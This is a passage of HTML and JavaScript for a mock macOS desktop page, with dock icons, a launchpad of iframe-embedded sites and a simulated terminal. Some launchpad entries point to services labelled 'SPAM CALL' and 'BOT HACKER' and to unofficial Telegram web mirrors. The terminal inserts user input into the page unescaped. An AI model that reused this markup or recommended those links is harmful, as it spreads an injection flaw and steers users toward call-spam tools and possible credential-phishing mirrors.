        <div class="dock-item" onclick="openApp('QWEN AI', 'QWEN AI', `<iframe src='https://chat.qwen.ai/' class='w-full h-full border-0'></iframe>`)" ><img src="data:image/jpeg;base64,/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEAAkGBxAQDxEQEBEPFRAPFRgQFRcVEBYXERUVGBYWFxUXGBgZHiggGhooHBYWITMhJSkrLjAxICEzODMsNygtLisBCgoKDg0OGxAQGjUlHSU1Ly4tKy0tLS0rLS0tLy0tLzAtLS0tLTUwMCs2NS0uLS0tLS0tLS4rLTAtKy01MC0tLf/AABEIALQAtAMBEQACEQEDEQH/xAAcAAEAAgMBAQEAAAAAAAAAAAAABgcBAgUEAwj/xABDEAABAwIDAwYMAwYGAwAAAAABAAIDBBEFITEGEkEHEyJRYXEUFyMyQlOBkZKT0dIVUlRicpShwdMWM2SCpONDVbH/xAAaAQEAAgMBAAAAAAAAAAAAAAAAAQIDBQYE/8QANhEAAgEBAwgJBAICAwAAAAAAAAECAwQRMQUSEyFBcZHRFBUyUmGBseHwIlFTwaGiQmMjQ/H/2gAMAwEAAhEDEQA/ALxQBAEAQBAEAQBAEAQBAEAQBAEAQBAEAQBAEAQBAEAQBAEAQBAEAQEFxjlJhhmdHDDzzWZF4l3Wl3Hd6Ju39rjnbKxO7oZFnUgpTlmt7Lr+OtcC2aeLxpf6P/kf9azdQ/7P6+4zTPjR/wBH/wAj/rTqH/Z/X3IuOzsxtzHWTcw6IxPcCWdPfDrAlwJ3Rumwv1a6ZX8dsyVKz09IpXrbquu/kglq1QCAIAgCAIAgCAIAgCAIAgCAIAgCAICMbf4+KOlLWkieoBZHYHLQPfcEWIDsuNyMrXWyyZZNPWvfZjrf6Xnt8C0Vezj4JsQ12FvZIAKmoAlBOrCB5NvuJv8AvHqXrtGVGrWpR7MdW/7+24N6ys5onMc5jwQ5hLXA6gg2IXRxkpJNYMsYCkg+tLO6N7JGGz43B7TYGzmm4NjkcwqzgpxcZYPUQy9tn8XZWU7J2C29cObvAljhq02940uCDYXXEWqzys9R05cfuvn8lTorzgIAgCAIAgCAIAgCAIAgCAIAgCA1lka1pc4hrWguJJs0AZkknQKUnJ3LEFZYQ04zijqp7SKWmDQ1rgL2Fyxptrd284jO2lzkujrvq+yKkn9cvjflguJkf0q4s9c2YysOVLAdx4rIx0ZLMltwd6LvaMu8DrXSZGtedHQyxWG4tFkBW9LGQhUl/J5tEKWYwyuAgnObnOIEbwDZ3UAcgT3G9mrU5Vsemp58V9S/le2K89Wshlmfj1F+rpf4iP6rnOiV/wAb4Mgfj1H+qpfnx/VOiV/xvgwPx6j/AFVL8+P6p0Sv+N8GLx+O0f6ql+fH9U6JX7j4Mi9Gfx2j/VUvz4/qnRK/cfBi9Hsp52SND43New6Oa4OabGxsRlqCsMoSg7pK5+JJ9FUBAEAQBAEAQBAEAQED5UMZe1sVDAXc7U5vDbgmMktazTPedfQ+jY5OW8yPZotyr1MI4b8b/L9+BkpraySbK4M2ipWQi2950h/M86nu4DsAWuttpdoqubw2biknezsLyEEb5QMRjgoZGvAc6cc0xp4uPpf7de+y2OS6M6loTjqu1t/PuTFaylQuxLmQoINghBsFBVmwKgqbIQZCgg2CFSacnGOGKbwV5AinJLb2FpbC2d9CBa2ee7bUrTZWsufDSxxWO729LyYO53FnLmjKEAQBAEAQBAEAQHlxOuZTwyTyGzIml5zFzbRouQN4mwA4khZKNKVWahHFkpXu4rbYSlfVVcuJVGbi47mtt462uSd1os0dXsXRZRnGjRjZqfnu98WZKjuWaizY3LnJIxH1vl3KoKQ23x7w2rc5p8jFeOPqI4u9pz7rLs8nWTo9FJ9p63y8jLFXI4AXuDMhCDYKCDYIVZkKCpuFBBkIQbBQVZ9IpC1wc0kOaQ4EGxBGYII0KrJJq54FS59k8X8LpGSE+Ub5OT99trnQDMEOyyF7cFx1us+grOKwxW72wM0XejsLyEhAEAQBAR3bnHzRUpcwgTyncjuAbcXPsTmAO8XLbixWwybZOkVrpdla3y8/S8mKvZBtn8MxSuh52HEXgBxaWuqpw9pHWADwsVurVXsdmnmTo/1iZG0th0TsfjX/ALE/xdR9q8/WNg/D/WPMZ8fseav2DxaZm7LWMla07wa+omcN4A2sHNtfMi/aslPKtihK+FO7xSS9GWVSK2HW2SqW8wxjRu835NzTq17cnA9t815rdB6Rt679d/gYZ35xLqaRamcSp5dpqSonpXw0zo2vl6DnPc4AMPnW3Qczp3ErLY6lKlVU6qbS+33LRav1le+LCt9bSfHJ9i33Xln7suC5mTPRnxY1vraT45PsTryz92XBcyM9GRyZVvraX45PsUdeWfuvguZGcjYcmdb62l+OT7E67od18FzIvM+LSs9bS/HJ9ijruh3XwXMi8z4taz1tL8cn2J13Q7r4LmQZHJtWetpfjk+xR11Q7r4LmRcZ8W9Z6yl+OT7E66ofZ8FzIuM+Lis9ZS/HJ9iddUPs/wCOZGaZ8XNZ6yl+OT7FHXVD7PguZGYzfYdstPibqdrmvaQ5kpZvGMbouHcMw6zbkekRxUZScKtlVRq56rr7r9ftr8iI6mWcuaMoQBAEBrLI1rS5xAa0FxJNgAMySToFKTbuWIKM2txo11U6axDAAyNptvBg67cSS53G17XNl2thsvRqKhtxe/5qLo9WwWPeB1QDzaGezH9Q/K/2E+4lY8p2TpFHV2lrXIlq9F1rjTGEBBdpaXwOsbUtygrCGS9TJvRd3OGvat3Y6mnoaJ9qOteK+3kX7UfFHcoZ72XjqRMR14nrySRY+wWMGUAQBAEAQBAEAQHA20xvwSmJafLS3ZH1g8Xewfzsvfk+y6err7K1vl5kN3Hw2CwV1NTF8jSJqg77gb7zWi+40i+uZdwPSsdFfKdpVardHsx1L98vLURFXEmWtLBAEAQEH5TceMUQpI/PnbvPN3AtjvYAWyO8Q4HPQEWzC3WR7Ipz00sI4b/b13Aqsrpy6NCFJZFw8nGP+E03MvPlqYBpvq5nou/oe4da5LK1k0NXPj2Zeu0pJXEuWqKnjxfDmVMEkEg6Mjd3tB4OHaDYrLQrSo1FUjiiU7neQnAsQMRfT1Dmtnp3c267rbw9F4vwIsVurRSU0qlNfTLWuXkJx13rAlFNicPrYvmN+q1k6FTuvgRcz3NxKD10XzG/VYXRqd18CbmbfiMHrofmN+qroandfAXGfxCD10PzG/VNDU7r4C4fiEHrovmN+qaGp3XwIuH4hB66L5jfqmhqd18APxCD10XzG/VNDU7r4AeHw+ti+Y36poandfADw+H1sXzG/VNDU7r4AHEIfWxfMb9U0NTuvgCA0TTi+JmUgGkpSMiRm25LBukG+84EnLS4vot9UasFkzF25fHw2eJXFljrnSwQBAEAQES5RcDbPSuna0c9TDfvxdELl7SbjIZu46EDzltck2p0qqpt/TL12cvXAFRELrCUzQhSXR0NnMXdR1Mc7b2B3Xj8zD5w/r3gLz2uzq0UnB+W8nFF8007ZGNkYQWPAc0jQgi4K4ecHCTjLFGI+iqCveVfZ/nIxWxjpxDdltxZwd7Cfcexb7ItrzZaGWDw3+5mpS2FVBdOZmbBCpkKCDYKCDYIVZsFBU9uEUDqiZkTNXHM9TRqfcsNesqUHNkMsZuy9OABzTMssxmufduqv/IxazP+Gaf1TPhTp1TvAx/hqD1TPcnTqneByKeR2FV7HXIpZzZ4z3d3Q3FjmwneFs7ZcSvXOKttma/zWHzxw/kFoRyBzQ5pBa4BwINwQcwQRqFzLTTueJY2UAIAgCAICmNu8F8Fq3brbQzeVjsLNF/OYLAAWPAaAtXYZNtWnoq9/UtT/T8/W8EaIWxLI1IUl0WVyV49drqKQ5tu+K/EavZ7Nff1LnctWS56eO5/plZLaWIufKGk0TXtcxwBa8FrgdCCLEFTGTi01igUHtZgjqGrfCb7nnxnrYdPaMwe0LubFaVaKKnt27z1xlnK85AXrBkKCDYKCpsEINgoKstbk72f5mn8IkHlKgXF9Wx+j79fcuYyrbNJU0ccI+vsY5Eu5harPKmOYTPA8HTPBytpcCFVTujAHODpxnqcNB3HReqx2t0aqls27hcc7k5xrnIjRy73PU17XBvzYIFiSdWk7tsst22hXoytZs2emj2ZevvjvvCJktOSEAQBAEBxdr8H8MpJIgPKN8pH++0Gw1AzBLc8he/BeywWno9ZSeGD3e2PkCkZo3NcWuBDmktIIsQRkQQdCu0jJNXrAlM+RCksj6UVW+CVksZs+NwcD2j+irUpxqQcJYMsX1geJsq6eOdmjxmOLXDJzT3FcPaKEqFR05bDG1ce9YCCKcomz/hlIXsF56e72W1c302e0C47QOtbPJVr0Fa6XZlqf6ZkpyuZSYXZHoMhCDYKCpsFBBItiMC8NqmtcPIxeUk6rcG+05d1+peDKNr6PRbXaepc/IpJ3Iu4NAyGgXGXmIzZLwRLGNsGQYhFTZc0OjM78rnW3fdx7+xbWhk2VWzSq7di3Y8dhJLLLVECyXgr7bGjdQ1sOIwt6Jd5QC3nWIcNDbebcXtkblb6wVFaaErNN69nzwZDJ3h1ayeGOaM3ZI0OGYuL6g2JFwbgjrBWkq0pUpuEsUSehYwEAQBAEBV3KbgIilFXH5k7t14s0Bslrgi2Z3gHE5agm+YXTZHtbnDQyxjhu9vTcCCkLdlkaEKSyJpyZY9zE5ppD5KoPRvo2XQfFp32WnyxZNJT0scY+ntzEleW0uVMYQFKco+z/glVzjBaCou9ttGu9Nv87jsPYuxyVa9PSzZdqOry2M9NOV6IoFtCxkKCGbsBJAAuTkANSoeoqXnsXgQoqRrCBzsnlJD+0dG9wGXv61xWULV0is2uytS+eJgk72d9eEg5W0+MNo6Z8xtveawfmefNHdxPYCvVY7M7RVUFht3EoouaZz3Oe8kueS5xOpJNyV20YqKUVgixbvJ3jvhNNzTz5anAaetzPRd/Q9w61ymVbJoaufHsy9dpVksWqIPJitAyohkhk82QW7QeBHaDYrLQrSpVFOOKBDNg8QkpqiTDJ9WlzozdxzAuWgabpaC8acdd5bjKdGNWmrVT8L/n3WH/AIQifLREhAEAQBAc7aGKnfSzNqnbsBb03XsRYgtI7d4CwzubCxvZeiyyqRrRdJXy2AoYruAjUqS6NQSDcGxGYI1U4lkXfsXjoraVryRzsfk5B+0NHdxGfv6lxeULL0es0sHrXzwMclczvrwkHI2qwVtbSvgNt7zoz+V48093A9hK9ditLs9VTWG3cWjLNd5QU0TmPcx4IcwlrgdQQbELuIyUkpLBnqNQrEE55L8A5+c1Ug8lTno30dLqPh177LS5Ytejp6KOMvT35mKo7tRbq5QwhAU3yhY/4VVGNhvDT3Y3qc703e8WHYO1ddkuyaGlnS7UvTYi6RFgtmDqbO4u+jqWTtzAyc2/nMPnD+veAvPa7PG0UnB+W8hk98ZsH6eX4mrRdR1O+ipnxmQfp5fianUdTvoi8jG1e0EVXLHPCySKaPIu3hc2N2kEZhwPH6LZWKxzoQdObTi/j4kMtyidIYozKA2UsaXgaB9hvAZnK9+JXKVFFTahhfq3Fj7KgCAIAgK65TscBtRRk9Eh82RA0BY298xnvHL8udwV0GR7Ld/zy3L9v9cSrZXjgt+SjQhWLo0IUljvbE474FVtc4+Rl8nJ1AcHew59114co2XpFFpdpa188SWr0XeDcXGhXFmI1cVZIFU8qWCbsgrIx0ZLMltwd6LvaMu8DrXT5GtN8dDLZhuM9KWwhOH0j55WQxi75HBrR2nr7OK3FWpGnBzlgjI9R+gMDwtlJTxwM0jGZ4udq5x7zdcLaa8q9R1JbTyt3u896wEEW5Qsf8EpSxhtNUXYzra303e42HaexbPJdk09W+XZjrf6RaKvZTC7AyM2CgqbBQQZCFWbKCpNOTPBueqDUPb5On824yMp01FjujPUEHcK02WLTo6ejjjL098PFXhFqrmCQgCAIDw43iQpaeSdzS4RgZA2JJIa0X4C5Gf/ANWezUHXqqmndeQ3cijqqZ0j3yPN3yOL3GwF3E3JsMtSu1hFQioxwWoxpnwIVy6MMic5wa0EucbAAXJJ0AA1KOSSveBZM9hwGs/S1XyJPosXS6HfXFFkzQ4BW/pKr+Hk+idLofkXFFky1NgKyodS8zUxTMfBZrTJG5u8z0bFwzI07rLmcqU6Sq59KSal9mnc/crIkMz1r4oqcDHgyWKSOTzHtIP19mq99mzoTUo4ohO53o4XJXs6Gb9a/PeJjhNvRBs5479B7ete3LNszrqK3vkZ6sthYq58wmk0rWNc9xAawFxJ0AAuSVMYuTSWIKH2qxt1bVPmN9zzYx1MGntOp7Su4sVlVnoqG3bvM6VyOSF6gbBQVNgoIMoVPXhtE+omjhjF3yuDRkbC+pNgTYC5J4AFYq1WNKDnLBFWXpg2HNpaeKBmYiba+fScc3OsSbXcSbXyuuJtFZ1qkqj2/ED2rCAgCAIDz4hRsnifDILskaWnS46iLgi4NiD1gLJSqSpTU44ohq8pHGcPdTVEkDszG618s2nNrrAm12kG3C67Sz1lWpqotpiwZ4SsxZE75MsC3nmskHRZdkV+LvSd7Bl7T1LR5Ytd0dDHbiXRZK50kwUB83uVkgc+rmsvRCJBEsW36qeOhjJBm6Urh6EI84950C2tG6hTdeWzDxewtBf5E+poGxsbGwAMYA1oGgAFgFopzc5OUsWQfRVBX3KrtBzcYooz05Rvy24M4N9pHuHat9kWyZ0tNLBYb/YyU47SrAumMpsCoIO/sds86vqNy5bFGN+RwGdr2DQbWDjna/AE52sfDb7YrNTzsW8F+9yKSdxPvFnRetq/jj/trR9d2jux4PmUzh4tKL1lV8cf2KOu7R9o8HzIvOpgGx9LRSGWPnHyWsHSFpLOvds0WJ0vr7zfzWrKVa0RzJXJeG3frIJCvAAgCAIAgCAhvKPgYlh8KYDzsAAda5vFc3ytqCb3yy3r6BbjJNqzJ6KWDw3+/rcUmtpXWE4c+pnjhZq82vwA4k9gFyugr1o0abnLYVRd9BRsgiZFGLMjaGj6ntOq4urUlUm5yxZlPQsYNXFSgeWeSyyxRBH8Zr2xsc9x6LQSV77PSc5JIYn22IwtzInVUw8vV2eQdWR/+NnuzPf2KmUa6lNUodmP8vay7+yJMtaVPHjGIspYJJ5PNjbftJ0DR2k2CzUKMq1RU44slK93H5+xOvfUTSTyG75XFx6h1AdgFgu6o0o0oKEcEelK5XHnCyA2CFWXnsVs+KGlDXf50tpJTZtw6w6AI1a3ManMuPGy4rKFr6TVvXZWpc/PkYZO9kgXgKhAEAQBAEAQBAEBrJGHNLXAFrgWkEXBByIIOoUptO9YggR2KrIKiSSinhjY4kNu54eGE33T0XaaXvna63vWdCpTUa8W3twuv++KKZrWB9vwPG/1sXxv/tqnSsn/AInwXMm5mpwLG/1sXzH/ANtOl5P/ABPguZJqcAxz9dD8x/8AbU9Lyf8AifBcyT5u2bxs61sPzH/21ZW3J6/63wXMnUcXaTAMTp4DPPNFLHG5pcA4m2YDSQ5oBG9YWz10XsslrslWpo6cWm7/AJqbLRuvLJ2exZlZTRztsN4WcPyvHnN9/wDKy521Wd0Krpv4irVx0l5yCpeVXaDnZhRxnycBvJbR0nV/tB95PUupyLZMyGmli8N3ueilG7WQILeGRmQhBN+TDABUVBqZAeapSC3MgOmuC3O2YaBci+pbqCVpssWvRU9HHGWO735mKbuLfXJmEIAgCAIAgCAIAgCAIAgCAIAgCA1lja5pa4BzXAtIIu0g5EEHUKU3F3rEFbbOTuwrE5KGQnwedw5tztM/8p17AG46BIFrjsXRWuCttlVePaWP7X7XhvLvWryYbYY4KKkfLlzjuhGOt50PcNfZ2rUWCyu0VlHZi9xEVeyhZXlxLnElzjck6knUldwkkrkepGikk9FBRyTyMiiYXySGzWjU/QWzJOQGapUqRpxc5u5Iq9R+gsDwxtJTRU7MxE218+k45vdYk2u4k2vldcHaK7r1ZVHt+LgeVu93nuWEgIAgCAIAgCAIAgCAIAgCAIAgCAICKcomBOqqUPiaXT0532AXLnNNg9oF9cg7Qno2Gq2mSrUqFbNk/plqf65ed7wLRdzKu2gx+at5rnT/AJLAwdp9J5/aOXuXS2WyU7PnZm13+3kZYq44xC9ZdGhUl0WjyVbNPZetmZbfbuwA2vunzpLEXFxYA3zBdlYgnmstW1S/4IPDtcufjcYKstiLHXPmEIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgP/Z" alt="Safari"></div>
        <div class="dock-item" onclick="openApp('Qrcode-Monkey', 'Qrcode-Monkey', `<iframe src='https://www.qrcode-monkey.com/ar/' class='w-full h-full border-0'></iframe>`)" ><img src="https://cdn-icons-png.flaticon.com/128/10401/10401171.png" alt="Safari"></div>
<div class="dock-item" onclick="openSettings()"><img src="https://cdn-icons-png.flaticon.com/128/668/668293.png" alt="Settings"></div>
        
<div class="dock-item" onclick="openIncognito()">
    <img src="https://cdn-icons-png.flaticon.com/128/11213/11213211.png" alt="Incognito">
</div>

    </div>

    <div id="launchpad" onclick="toggleLaunchpad()">
        <div class="launchpad-grid" onclick="event.stopPropagation()">
        </div>
    </div>

    <template id="window-template">
        <div class="window">
            <div class="title-bar">
                <div class="traffic-lights">
                    <button class="traffic-light close-btn"></button>
                    <button class="traffic-light min-btn"></button>
                    <button class="traffic-light max-btn"></button>
                </div>
            </div>
            <div class="window-content"></div>
        </div>
    </template>

    <script>
        const desktop = document.getElementById('desktop');
        const windowTemplate = document.getElementById('window-template');
        const dock = document.getElementById('dock');
        const topBar = document.getElementById('top-bar');
        const launchpad = document.getElementById('launchpad');
        const launchpadGrid = launchpad.querySelector('.launchpad-grid');
        const topBarHeight = topBar.offsetHeight;
        const appleMenuBtn = document.getElementById('apple-menu');
        const appleMenuDropdown = document.getElementById('apple-menu-dropdown');

        let activeWindow = null;
        let highestZ = 10;
        const openWindows = new Map();
        
        const fileSystem = {
            currentPath: '/ABOELFADLs/ABOELFADL/Desktop',
            files: {
                '/ABOELFADLs/ABOELFADL/Desktop': {
                    type: 'folder',
                    children: {
                        'Applications': { type: 'folder', children: {} },
                        'Documents': { type: 'folder', children: {} },
                        'Downloads': { type: 'folder', children: {} },
                        'Music': { type: 'folder', children: {} },
                        'Pictures': { type: 'folder', children: {} },
                        'readme.txt': { type: 'file', size: '1.2 KB', modified: '2024-01-15' },
                        'screenshot.png': { type: 'file', size: '2.5 MB', modified: '2024-01-14' },
                        'report.pdf': { type: 'file', size: '850 KB', modified: '2024-01-13' }
                    }
                },
                '/ABOELFADLs/ABOELFADL/Documents': {
                    type: 'folder',
                    children: {
                        'Work': { type: 'folder', children: {} },
                        'Personal': { type: 'folder', children: {} },
                        'project.docx': { type: 'file', size: '45 KB', modified: '2024-01-15' }
                    }
                },
                '/ABOELFADLs/ABOELFADL/Downloads': {
                    type: 'folder',
                    children: {
                        'chrome.dmg': { type: 'file', size: '85 MB', modified: '2024-01-15' },
                        'image.jpg': { type: 'file', size: '3.2 MB', modified: '2024-01-14' }
                    }
                }
            }
        };
        
        let clipboard = {
            type: null,
            data: null
        };

        const apps = [
            
            { id: 'terminal', name: 'أكسسواريز مصر سيزما', icon: 'https://api.cezma.cloud/storage/thumbnails/stores/1754618155upscalemedia-transformed.jpeg', action: () => openApp('Accessories cezma', 'Accessories cezma', `<iframe src='https://cezma.com/store/Accessories.Egypt.official' class='w-full h-full border-0'></iframe>`) },
  { id: 'terminal', name: 'ملابس ابو الفضل', icon: 'https://api.cezma.cloud/storage/thumbnails/stores/1738805210475998141-600034349848814-4941404275909867901-n.jpg', action: () => openApp('ملابس ابو الفضل', 'ملابس ابو الفضل', `<iframe src='https://cezma.com/store/aboelfadl.clothing' class='w-full h-full border-0'></iframe>`) },  { id: 'terminal', name: 'AboElfadl Store ', icon: 'https://api.cezma.cloud/storage/thumbnails/stores/1745806076temp9057433686712277858.png', action: () => openApp('AboElfadl Store', 'AboElfadl Store', `<iframe src='https://cezma.com/store/AboElfadl-Store' class='w-full h-full border-0'></iframe>`) },  
{ id: 'terminal', name: 'news technolog hack', icon: 'https://cdn-icons-png.flaticon.com/128/8798/8798018.png', action: () => openApp('news technolog hack', 'news technolog hack', `<iframe src='https://news-technolog-hack.blogspot.com/' class='w-full h-full border-0'></iframe>`) },  
{ id: 'terminal', name: 'BOT HACKER', icon: 'https://cdn-icons-png.flaticon.com/128/18266/18266361.png', action: () => openApp('BOT HACER', 'BOT HACHER', `<iframe src='https://my_aboelfadl_helper_.eyoo.org/' class='w-full h-full border-0'></iframe>`) },
            { id: 'terminal', name: 'SPAM CALL', icon: 'https://cdn-icons-png.flaticon.com/128/3262/3262401.png', action: () => openApp('SPAM CALL', 'SPAM CALL', `<iframe src='https://amr-elsherif.net/' class='w-full h-full border-0'></iframe>`) },
{ id: 'terminal', name: 'TELEGRAM 1', icon: 'https://cdn-icons-png.flaticon.com/128/5968/5968804.png', action: () => openApp('TELEGRAM 1', 'TELEGRAM 1', `<iframe src='https://web.telegram.im/' class='w-full h-full border-0'></iframe>`) },
{ id: 'terminal', name: 'TELEGRAM 2', icon: 'https://cdn-icons-png.flaticon.com/128/5968/5968804.png', action: () => openApp('TELEGRAM 2', 'TELEGRAM 2', `<iframe src='https://web.tel.onl/ar.html#-1626502648' class='w-full h-full border-0'></iframe>`) },
{ id: 'terminal', name: 'TELEGRAM 3', icon: 'https://cdn-icons-png.flaticon.com/128/5968/5968804.png', action: () => openApp('TELEGRAM 3', 'TELEGRAM 3', `<iframe src='https://xn--80affa3aj0al.xn--80asehdb//' class='w-full h-full border-0'></iframe>`) },
{ id: 'terminal', name: 'BOT HACKER', icon: 'https://cdn-icons-png.flaticon.com/128/18266/18266361.png', action: () => openApp('BOT HACER', 'BOT HACHER', `<iframe src='https://web.whatsapp.com/' class='w-full h-full border-0'></iframe>`) },
        ];

        function updateClock() {
            const clockElement = document.getElementById('clock');
            if (!clockElement) return;
            const now = new Date();
            clockElement.textContent = now.toLocaleTimeString('en-US', { hour: '2-digit', minute: '2-digit', hour12: true });
        }
        setInterval(updateClock, 1000);
        updateClock();
        
        appleMenuBtn.addEventListener('click', (e) => {
            e.stopPropagation();
            appleMenuDropdown.style.display = appleMenuDropdown.style.display === 'block' ? 'none' : 'block';
        });
        document.addEventListener('click', () => {
            appleMenuDropdown.style.display = 'none';
        });

        function toggleLaunchpad() {
            launchpad.classList.toggle('visible');
        }
        
        function populateLaunchpad() {
            launchpadGrid.innerHTML = '';
            apps.forEach(app => {
                const appEl = document.createElement('div');
                appEl.className = 'launchpad-item';
                appEl.innerHTML = `<img src="${app.icon}" alt="${app.name}"><span>${app.name}</span>`;
                appEl.onclick = () => {
                    app.action();
                    toggleLaunchpad();
                };
                launchpadGrid.appendChild(appEl);
            });
        }
        populateLaunchpad();

        function setupDockMagnification() {
            const dockItems = document.querySelectorAll('.dock-item');
            dockItems.forEach(item => {
                item.addEventListener('mousemove', () => {
                    if (!dock.classList.contains('magnification-enabled')) return;
                    dockItems.forEach(otherItem => otherItem.classList.remove('prev-hover'));
                    const prev = item.previousElementSibling;
                    if (prev) prev.classList.add('prev-hover');
                });
            });
            dock.addEventListener('mouseleave', () => {
                dockItems.forEach(item => item.classList.remove('prev-hover'));
            });
        }
        setupDockMagnification();

        function bringToFront(windowEl) {
            if (activeWindow === windowEl) return;
            highestZ++;
            windowEl.style.zIndex = highestZ;
            activeWindow = windowEl;
        }

        function createWindow(id, title, content, options = {}) {
            const windowEl = windowTemplate.content.cloneNode(true).firstElementChild;
            windowEl.id = `window-${id}`;
            if (options.minWidth) windowEl.style.minWidth = options.minWidth;
            if (options.minHeight) windowEl.style.minHeight = options.minHeight;

            windowEl.querySelector('.title-bar').insertAdjacentHTML('beforeend', `<span class="text-sm font-semibold text-gray-800 absolute left-1/2 -translate-x-1/2">${title}</span>`);
            windowEl.querySelector('.window-content').innerHTML = content;
            
            const initialTop = topBarHeight + 20 + (Math.random() * 50);
            windowEl.style.top = `${initialTop}px`;
            windowEl.style.left = `${Math.random() * 20 + 20}vw`;
            
            desktop.appendChild(windowEl);
            openWindows.set(id, windowEl);
            bringToFront(windowEl);

            makeDraggable(windowEl);
            setupWindowControls(windowEl, id);
            windowEl.addEventListener('mousedown', () => bringToFront(windowEl), true);
            windowEl.classList.add('genie-animate');
            windowEl.addEventListener('animationend', () => {
                windowEl.classList.remove('genie-animate');
            }, { once: true });
            windowEl.style.width = options.width || '700px';
            windowEl.style.height = options.height || '500px';
            return windowEl;
        }

        function openApp(id, title, content) {
            if (openWindows.has(id)) {
                bringToFront(openWindows.get(id));
            } else {
                createWindow(id, title, content);
            }
        }
        
        function makeDraggable(element) {
            const titleBar = element.querySelector('.title-bar');
            let offsetX, offsetY;
            const onMouseMove = (e) => {
                let newTop = e.clientY - offsetY;
                if (newTop < topBarHeight) { newTop = topBarHeight; }
                element.style.top = `${newTop}px`;
                element.style.left = `${e.clientX - offsetX}px`;
            };
            const onMouseUp = () => {
                document.removeEventListener('mousemove', onMouseMove);
                document.removeEventListener('mouseup', onMouseUp);
            };
            titleBar.addEventListener('mousedown', (e) => {
                if (e.target.tagName === 'BUTTON') return;
                offsetX = e.clientX - element.getBoundingClientRect().left;
                offsetY = e.clientY - element.getBoundingClientRect().top;
                document.addEventListener('mousemove', onMouseMove);
                document.addEventListener('mouseup', onMouseUp);
                bringToFront(element);
            });
        }
        
        function setupWindowControls(windowEl, id) {
            windowEl.querySelector('.close-btn').addEventListener('click', (e) => {
                e.stopPropagation();
                windowEl.classList.add('genie-close');
                windowEl.addEventListener('animationend', () => {
                    windowEl.remove();
                    openWindows.delete(id);
                    if (activeWindow === windowEl) activeWindow = null;
                }, { once: true });
            });
            windowEl.querySelector('.min-btn').addEventListener('click', () => console.log('Minimize'));
            windowEl.querySelector('.max-btn').addEventListener('click', () => console.log('Maximize'));
        }

        function openTerminal() {
            const id = 'terminal';
            if (openWindows.has(id)) { bringToFront(openWindows.get(id)); return; }
            const content = `
                <div class="terminal-body">
                    <div class="terminal-header">
                        <div class="terminal-tabs">
                            <div class="terminal-tab active">Terminal</div>
                            <div class="terminal-tab">Terminal 2</div>
                            <div class="terminal-tab">Terminal 3</div>
                        </div>
                    </div>
                    <div class="terminal-content">
                        <div class="terminal-output">
                            <div class="terminal-line">Last login: ${new Date().toUTCString()} on console</div>
                            <div class="terminal-line">Welcome to macOS Terminal</div>
                            <div class="terminal-line">Type 'help' for available commands</div>
                            <div id="terminal-output-${id}"></div>
                        </div>
                        <div class="terminal-input-line">
                            <span class="terminal-prompt">ABOELFADL@mac:~$</span>
                            <input type="text" class="terminal-input" id="terminal-input-${id}" autofocus placeholder="Enter command...">
                        </div>
                    </div>
                </div>
            `;
            const windowEl = createWindow(id, 'Terminal', content, {minWidth: '100vh', minHeight: '400px'});
            
            const terminalStyle = document.createElement('style');
            terminalStyle.textContent = `
                .terminal-body {
                    display: flex;
                    flex-direction: column;
                    height: 100%;
                    background: #1e1e1e;
                    color: #d4d4d4;
                    font-family: 'SF Mono', Monaco, 'Cascadia Code', 'Roboto Mono', Consolas, 'Courier New', monospace;
                    font-size: 14px;
                    line-height: 1.5;
                }
                
                .terminal-header {
                    background: #2d2d30;
                    border-bottom: 1px solid #3e3e42;
                    padding: 12px 16px;
                    height: 48px;
                    box-sizing: border-box;
                    display: flex;
                    align-items: center;
                }
                
                .terminal-tabs {
                    display: flex;
                    gap: 8px;
                }
                
                .terminal-tab {
                    padding: 8px 16px;
                    background: #3c3c3c;
                    border-radius: 6px;
                    cursor: pointer;
                    font-size: 13px;
                    transition: all 0.15s ease;
                    font-weight: 500;
                    margin-right: 8px;
                }
                
                .terminal-tab.active {
                    background: #007AFF;
                    color: white;
                    font-weight: 600;
                }
                
                .terminal-tab:hover:not(.active) {
                    background: #666;
                }
                
                .terminal-content {
                    flex: 1;
                    display: flex;
                    flex-direction: column;
                    padding: 16px;
                }
                
                .terminal-output {
                    flex: 1;
                    overflow-y: auto;
                    margin-bottom: 8px;
                }
                
                .terminal-line {
                    margin-bottom: 2px;
                    word-wrap: break-word;
                }
                
                .terminal-input-line {
                    display: flex;
                    align-items: center;
                    gap: 8px;
                }
                
                .terminal-prompt {
                    color: #007AFF;
                    font-weight: 600;
                    white-space: nowrap;
                    font-family: 'SF Mono', Monaco, 'Cascadia Code', 'Roboto Mono', Consolas, 'Courier New', monospace;
                }
                
                .terminal-input {
                    flex: 1;
                    background: transparent;
                    border: none;
                    color: #f8f8f2;
                    font-family: inherit;
                    font-size: inherit;
                    outline: none;
                    caret-color: #f8f8f2;
                }
                
                .terminal-input::placeholder {
                    color: #6272a4;
                }
                
                .command-output {
                    color: #f8f8f2;
                    margin: 4px 0;
                }
                
                .command-error {
                    color: #ff5555;
                }
                
                .command-success {
                    color: #50fa7b;
                }
                
                .command-info {
                    color: #8be9fd;
                }
            `;
            document.head.appendChild(terminalStyle);
            
            const input = windowEl.querySelector(`#terminal-input-${id}`);
            const output = windowEl.querySelector(`#terminal-output-${id}`);
            
            input.addEventListener('keydown', (e) => {
                if (e.key === 'Enter') {
                    const command = input.value.trim();
                    if (!command) return;
                    
                    output.innerHTML += `<div class="terminal-line"><span class="terminal-prompt">ABOELFADL@mac:~$</span> ${command}</div>`;
                    
                    let response = '';
                    let responseClass = 'command-output';
                    
                    switch (command.toLowerCase()) {
                        case 'ls':
                            response = 'Desktop    Documents    Downloads    Music    Pictures    Movies';
                            responseClass = 'command-success';
                            break;
                        case 'pwd':
                            response = '/ABOELFADLs/ABOELFADL';
                            responseClass = 'command-success';
                            break;
                        case 'date':
                            response = new Date().toString();
                            responseClass = 'command-info';
                            break;
                        case 'whoami':
                            response = 'ABOELFADL';
                            responseClass = 'command-success';
                            break;
                        case 'help':
                            response = 'Available commands: ls, pwd, date, whoami, clear, echo, cat, mkdir, cd';
                            responseClass = 'command-info';
                            break;
                        case 'clear':
                            output.innerHTML = '';
                            input.value = '';
                            return;
                        case 'echo':
                            const echoText = command.substring(5);
                            response = echoText || '';
                            responseClass = 'command-success';
                            break;
                        default:
                            response = `zsh: command not found: ${command}`;
                            responseClass = 'command-error';
                    }
                    
                    if (response) {
                        output.innerHTML += `<div class="${responseClass}">${response}</div>`;
                    }
                    
